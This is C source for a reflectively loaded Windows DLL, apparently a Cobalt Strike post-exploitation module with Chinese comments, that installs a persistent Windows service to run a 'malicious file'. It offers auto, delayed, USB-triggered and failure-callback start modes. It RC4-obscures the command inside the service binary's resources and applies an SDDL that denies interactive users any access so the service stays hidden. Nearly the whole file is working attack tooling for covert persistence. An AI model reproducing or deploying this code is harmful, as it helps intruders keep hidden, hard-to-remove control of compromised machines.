//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <windows.h> 
#include <stdio.h>
#include <stdlib.h>
#include <sddl.h>
static  char* ServiceName;
static  char* DisplayName;
#define BURSIZE 2048

/// <summary>
/// 检查当前用户是否为SYSTEM
/// </summary>
/// <returns>SYSTEM -> TRUE </returns>
BOOL CurrentUserIsLocalSystem()
{
	BOOL bIsLocalSystem = FALSE;
	PSID psidLocalSystem;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
	if (fSuccess)
	{
		fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
		FreeSid(psidLocalSystem);
	}
	return bIsLocalSystem;
}

/// <summary>
/// 根据错误代码，返回错误详情
/// </summary>
/// <param name="Text">要输出的字符串</param>
/// <returns>返回错误详情</returns>
PCSTR _FormatErrorMessage(char* Text)
{
	DWORD nErrorNo = GetLastError(); // 得到错误代码
	LPSTR lpBuffer;
	DWORD dwLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		nErrorNo,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language,
		(LPTSTR)&lpBuffer,
		0,
		NULL);
	if (dwLen == 0)
	{
		printf("[-] FormatMessage failed with %u\n", GetLastError());
	}
	if (lpBuffer) {
		printf("%s,ErrorCode:%u,Reason:%s", Text, nErrorNo, (LPCTSTR)lpBuffer);
	}
	return 0;
}

/// <summary>
/// RC4加密
/// </summary>
/// <param name="Data">源数据</param>
/// <param name="Length">源数据长度</param>
/// <param name="Key">key.默认取环境变量 PROCESSOR_REVISION</param>
/// <param name="KeyLength">key的长度</param>
void StreamCrypt(char* Data, long Length, char* Key, int KeyLength)
{
	int i = 0, j = 0;
	char k[256] = { 0 }, s[256] = { 0 };
	char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i % KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	int l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}


char* Getenv(char * ennv) {
	char* d = "123456";
	char* buf = NULL;
	size_t sz = 0;
	if (_dupenv_s(&buf, &sz, ennv) == 0 && buf != NULL)
	{
		return buf;
	}
	else {
		return 	d;
	}
}


/// <summary>
/// 在资源信息中添加要执行的命令
/// </summary>
/// <param name="outpath">要写入资源信息的文件</param>
/// <param name="exepath">要执行的命令</param>
/// <returns>成功返回1，其他返回0</returns>
BOOL AddResource(char* outpath, char* exepath)
{
	StreamCrypt(exepath, strlen(exepath), Getenv("PROCESSOR_REVISION"), strlen(Getenv("PROCESSOR_REVISION")));
	char Path[256] = { 0 };
	strcpy_s(Path, 256, exepath);
	HANDLE  hResource = BeginUpdateResource(outpath, FALSE);
	if (NULL != hResource)
	{
		if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), Path, strlen(Path)) != FALSE)
		{
			EndUpdateResource(hResource, FALSE);
			printf("[+] EndUpdateResource successfuly.\n");
			return 1;
		}
		else {
			_FormatErrorMessage("[-] 写入资源文件失败");
		}
	}
	return 0;
}


/// <summary>
/// HEX转ASCLL
/// </summary>
/// <param name="c"></param>
/// <returns></returns>
int hex2dec(char c)
{
	if ('0' <= c && c <= '9')
	{
		return c - '0';
	}
	else if ('a' <= c && c <= 'f')
	{
		return c - 'a' + 10;
	}
	else if ('A' <= c && c <= 'F')
	{
		return c - 'A' + 10;
	}
	else
	{
		return -1;
	}
}

/// <summary>
/// 解码URL，修改源内存
/// </summary>
/// <param name="url">URL编码信息</param>
void urldecode(char url[])
{
	int i = 0;
	int len = strlen(url);
	int res_len = 0;
	char res[BURSIZE];
	for (i = 0; i < len; ++i)
	{
		char c = url[i];
		if (c != '%')
		{
			res[res_len++] = c;
		}
		else
		{
			char c1 = url[++i];
			char c0 = url[++i];
			int num = 0;
			num = hex2dec(c1) * 16 + hex2dec(c0);
			res[res_len++] = num;
		}
	}
	res[res_len] = '\0';
	strcpy_s(url, BURSIZE, res);
}


/// <summary>
/// 检查文件是否存在
/// </summary>
/// <param name="lpFileName">filepath</param>
/// <returns>存在返回TRUE,失败返回FALSE</returns>
BOOL IsFileExist(LPCTSTR lpFileName)
{
	if (!lpFileName)
		return FALSE;
	DWORD dwAttr = GetFileAttributes(lpFileName);
	if (INVALID_FILE_ATTRIBUTES == dwAttr || (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
		return FALSE;
	return TRUE;
}

/// <summary>
/// 服务控制、配置设置
/// </summary>
/// <param name="lpszDriverPath">服务程序</param>
/// <param name="iOperateType">0 加载服务 1 启动服务 2 停止服务 3 删除服务</param>
/// <param name="sdli">sddl设置</param>
/// <param name="Describe">服务描述</param>
/// <param name="StartType">服务的启动类型,自动、手动、触发器、启动失败回调</param>
/// <param name="cmdline">要执行的命令</param>
/// <returns></returns>
BOOL SystemServiceOperate(char* lpszDriverPath, int iOperateType, int sdli, char* Describe, char* StartType, char* cmdline)
{
	BOOL bRet = TRUE;
	SERVICE_STATUS sStatus;
	SC_HANDLE shSCManager = NULL, shService = NULL;
	char* sddlstr;
	if (1 == sdli) {
		sddlstr = "O:BAD:(A;;GA;;;SY)(D;;GA;;;IU)(D;;GA;;;LA)(D;;GA;;;LS)";   //deny
	}
	else if (2 == sdli) {
		sddlstr = "O:BAD:(A;;GA;;;SY)(A;;GR;;;IU)(A;;GR;;;LA)(A;;GR;;;LS)";   //Read
	}
	else {
		sddlstr = "O:BAD:(A;;GA;;;SY)(A;;GA;;;IU)(A;;GA;;;LA)(A;;GA;;;LS)";   //Allow
	}

	shSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (0 != iOperateType)
	{
		shService = OpenService(shSCManager, ServiceName, SERVICE_ALL_ACCESS);
		if (!shService)
		{
			_FormatErrorMessage("[-] OpenService Failed(maybe you are not system)");
			goto cleanup;
		}
	}
	switch (iOperateType)
	{
	case 0:
	{
		//服务描述
		SERVICE_DESCRIPTION lpDescription = { Describe };

		//触发器,存在硬件设备时: Hardware ID generated by the USB storage port driver
		wchar_t szDeviceData[] = L"USB";
		// Allocate and set the SERVICE_TRIGGER_SPECIFIC_DATA_ITEM structure
		SERVICE_TRIGGER_SPECIFIC_DATA_ITEM deviceData = { 0 };
		deviceData.dwDataType = SERVICE_TRIGGER_DATA_TYPE_STRING;
		deviceData.cbData = wcslen(szDeviceData) * sizeof(WCHAR);
		deviceData.pData = (BYTE*)szDeviceData;
		// Allocate and set the SERVICE_TRIGGER structure
		SERVICE_TRIGGER serviceTrigger = { 0 };
		serviceTrigger.dwTriggerType = SERVICE_TRIGGER_TYPE_DEVICE_INTERFACE_ARRIVAL;
		serviceTrigger.dwAction = SERVICE_TRIGGER_ACTION_SERVICE_START;
		char* GUIDS = "53F56307-B6BF-11D0-94F2-00A0C91EFB8B";
		serviceTrigger.pTriggerSubtype = (GUID*)GUIDS;
		serviceTrigger.cDataItems = 1;
		serviceTrigger.pDataItems = &deviceData;
		// Allocate and set the SERVICE_TRIGGER_INFO structure
		SERVICE_TRIGGER_INFO serviceTriggerInfo = { 0 };
		serviceTriggerInfo.cTriggers = 1;
		serviceTriggerInfo.pTriggers = &serviceTrigger;

		//设置延时启动
		SERVICE_DELAYED_AUTO_START_INFO DelayAutoRun = { 0 };
		DelayAutoRun.fDelayedAutostart = TRUE;

		//设置启动失败回调动作
		SERVICE_FAILURE_ACTIONS sdBuf = { 0 };
		SC_ACTION action[1];
		action[0].Delay = 5 * 1000;
		action[0].Type = SC_ACTION_RUN_COMMAND;
		sdBuf.lpCommand = cmdline;
		sdBuf.lpRebootMsg = NULL;
		sdBuf.dwResetPeriod = 1;
		sdBuf.cActions = 1;
		sdBuf.lpsaActions = action;

		// SDDL
		PSECURITY_DESCRIPTOR sDescriptor = { 0 };

		printf("[+] StartType = %s\n", StartType);
		//SERVICE_AUTO_START 随系统启动
		if (strcmp(StartType, "SERVICE_AUTO_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}// SERVICE_DEMAND_START 手动启动
		else if (strcmp(StartType, "SERVICE_DEMAND_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}//启动失败的回调
		else if (strcmp(StartType, "SERVICE_Callback_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}//延时启动
		else if (strcmp(StartType, "SERVICE_CONFIG_DELAYED_AUTO_START_INFO") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}//触发器启动
		else if (strcmp(StartType, "SERVICE_HD_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}
		else {
			printf("[-] StartType not in function.\n");
			goto cleanup;
		}

		if (shService) {
			//设置描述信息
			if (!ChangeServiceConfig2(shService, SERVICE_CONFIG_DESCRIPTION, &lpDescription)) {
				_FormatErrorMessage("[-] ChangeServiceConfig2 Description failed");
				goto cleanup;
			}

			//设置启动失败事件
			if (strcmp(StartType, "SERVICE_Callback_START") == 0) {
				if (!ChangeServiceConfig2(shService, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf)) {
					_FormatErrorMessage("[-] 设置启动失败回调");
					goto cleanup;
				}
				else {
					printf("[+] Set CallbackRun Successfully\n");
				}
			}
			//设置延时启动配置
			if (strcmp(StartType, "SERVICE_CONFIG_DELAYED_AUTO_START_INFO") == 0) {
				if (!ChangeServiceConfig2(shService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &DelayAutoRun)) {
					_FormatErrorMessage("[-] 设置延时启动失败");
					goto cleanup;
				}
				else {
					printf("[+] Set Delayed Start Successfully\n");
				}
			}

			//设置触发器启动配置(硬件接口类)
			if (strcmp(StartType, "SERVICE_HD_START") == 0) {
				if (!ChangeServiceConfig2W(shService, SERVICE_CONFIG_TRIGGER_INFO, &serviceTriggerInfo)) {
					_FormatErrorMessage("[-] 设置触发器启动失败");
					goto cleanup;
				}
				else {
					printf("[+] Set Delayed Start Successfully\n");
				}
			}

			//默认不设置SDDL
			if (sdli) {
				//设置SDDL
				if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddlstr, SDDL_REVISION_1, &sDescriptor, NULL)) { //拒绝交互式用户所有权限。扩展：落地的文件设置权限，让人看不到
					_FormatErrorMessage("[-] ConvertStringSecurityDescriptorToSecurityDescriptor error");
					goto cleanup;
				}
				else {
					printf("[+] ConvertStringSecurityDescriptorToSecurityDescriptor successfully\n");
				}
				if (!SetServiceObjectSecurity(shService, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, sDescriptor)) {
					_FormatErrorMessage("[-] SetServiceObjectSecurity error");
					goto cleanup;
				}
				else {
					printf("[+] Service SDDL set successfully\n");
				}
			}
		}
		else {
			_FormatErrorMessage("[-] CreateService failed");
			goto cleanup;
		}
		break;
	}
	case 1:
	{
		// 启动服务
		StartService(shService, 0, NULL);	return TRUE;
		break; return TRUE;
	}
	case 2:
	{
		// 停止服务
		ControlService(shService, SERVICE_CONTROL_STOP, &sStatus);
		break;	return TRUE;
	}
	case 3:
	{
		// 删除服务
		DeleteService(shService);
		break;	return TRUE;
	}
	default:
		break;	return TRUE;
	}
	//关闭句柄
	if (NULL != shSCManager)
		CloseServiceHandle(shSCManager);
	if (NULL != shService)
		CloseServiceHandle(shService);
	return TRUE;

cleanup:
	if (NULL != shSCManager)
		CloseServiceHandle(shSCManager);
	if (NULL != shService)
		CloseServiceHandle(shService);
	return FALSE;
}


/// <summary>
///  解析参数
/// </summary>
/// <param name="Argvs">Argvs Cobalt sting</param>
/// <returns></returns>
BOOL ServiceMain(char* Argvs) {
	BOOL bRet = FALSE;
	char dest[4096];   //参数缓冲区
	memset(dest, '\0', sizeof(dest));
	int sdli = 0;
	const char s[2] = "|";  //分隔符
	char* next_token = NULL;
	char* Parame, * szFileName = NULL, * evilName = NULL, * Describe = NULL, * StartType = NULL, * SDL = NULL, * Dotype = NULL, * cmdline = NULL;
	Parame = Argvs;
	size_t len = strlen(Parame);

	if (len > sizeof(dest)) {
		printf("[-] 错误,当前长度为 %d ,缓存区溢出 %d 字节。\n", len, len - sizeof(dest));
		return FALSE;
	}
	strcpy_s(dest, 4096, Parame);

	ServiceName = strtok_s(dest, s, &next_token);  //服务名
	DisplayName = strtok_s(NULL, s, &next_token);  //显示名
	szFileName = strtok_s(NULL, s, &next_token);   //载荷服务程序,用于在内部执行恶意文件
	evilName = strtok_s(NULL, s, &next_token);     //恶意文件,用于检查文件是否存在
	cmdline = strtok_s(NULL, s, &next_token);      //要执行的命令
	Describe = strtok_s(NULL, s, &next_token);     //服务的描述
	StartType = strtok_s(NULL, s, &next_token);    //服务的启动类型,自动、手动、触发器、启动失败回调
	SDL = strtok_s(NULL, s, &next_token);          //安全描述符
	Dotype = strtok_s(NULL, s, &next_token);       //停止、启动、删除

	if (ServiceName != NULL && DisplayName != NULL && szFileName != NULL && Describe != NULL && StartType != NULL && SDL != NULL && Dotype != NULL)
	{
		
		urldecode(ServiceName);
		urldecode(DisplayName);
		urldecode(Describe);

		printf("[*] 服务名称: %s\n", ServiceName);
		printf("[*] 显示名称: %s\n", DisplayName);
		printf("[*] 服务文件: %s\n", szFileName);
		printf("[*] 恶意文件: %s\n", evilName);
		printf("[*] 执行命令: %s\n", cmdline);
		printf("[*] 服务描述: %s\n", Describe);
		printf("[*] 启动类型: %s\n", StartType);
		printf("[*] SDDL: %s\n", SDL);
		printf("[*] 当前动作: %s\n", Dotype);

		if (strcmp(SDL, "hidden") == 0) {
			sdli = 1;
		}
		else if (strcmp(SDL, "read") == 0)
		{
			sdli = 2;
		}
		if (sdli) {
			if (CurrentUserIsLocalSystem()) {
				printf("[+] Run As SYSTEM.\n");
			}
			else {
				printf("[-] Not Run As SYSTEM.\n");
				return FALSE;
			}
		}
		if (!IsFileExist(szFileName)) {
			printf("[-] 文件: %s 不存在.\n", szFileName);
			return FALSE;
		}
		if (!IsFileExist(evilName)) {
			printf("[-] 文件: %s 不存在.\n", evilName);
			return FALSE;
		}

		//创建服务、启动服务
		if (strcmp(Dotype, "start") == 0) {
			//对不是回调的命令行参数都使用RC4加密并写入服务程序的资源区
			if (strcmp(StartType, "SERVICE_Callback_START") != 0) {
				if (!AddResource(szFileName, cmdline))
				{
					_FormatErrorMessage("[-] AddResource Error,");
					return FALSE;
				}
				else {
					printf("[+] AddResource Successfully!\n");
				}
			}

			bRet = SystemServiceOperate(szFileName, 0, sdli, Describe, StartType, cmdline);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Create Error");
				return FALSE;
			}
			bRet = SystemServiceOperate(szFileName, 1, 0, 0, 0, 0);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Start Error");
				return FALSE;
			}
			//对不是回调类型的命令行解密对比
			if (strcmp(StartType, "SERVICE_Callback_START") != 0) {
				StreamCrypt(cmdline, strlen(cmdline), Getenv("PROCESSOR_REVISION"), strlen(Getenv("PROCESSOR_REVISION")));
			}
			printf("[+] ServiceName: %s\n", ServiceName);
			printf("[+] TransitPathName: %s\n", szFileName);
			printf("[+] Cmdline: %s\n", cmdline);
			printf("[+] Success! Service successfully Create and Start.\n");
		}
		//停止服务、删除服务
		else if (strcmp(Dotype, "stop") == 0)
		{
			bRet = SystemServiceOperate(szFileName, 2, 0, 0, 0, 0);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Stop Error,");
				return FALSE;
			}
			bRet = SystemServiceOperate(szFileName, 3, 0, 0, 0, 0);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Delete Error,");
				return FALSE;
			}
			printf("[+] ServiceName: %s\n", ServiceName);
			printf("[+] TransitPathName: %s\n", szFileName);
			printf("[+] EvilPathName: %s\n", evilName);
			printf("[+] Success! Service successfully Stop and Delete.\n");
		}
		else {
			printf("[-] 参数错误\n");
			return FALSE;
		}
	}
	return TRUE;
}

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
	{
		hAppInstance = hinstDLL;
		/* print some output to the operator */

		if (lpReserved != NULL) {
			if (ServiceMain((char*)lpReserved)) {
				printf("[+] Done.\n");
			}
			else {
				printf("[-] Failed.\n");
			}
		}
		else
		{
			printf("[-] NULL of parameters! Check your input.\n");
		}
		fflush(stdout);
		ExitProcess(0);
		break;
	}
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
}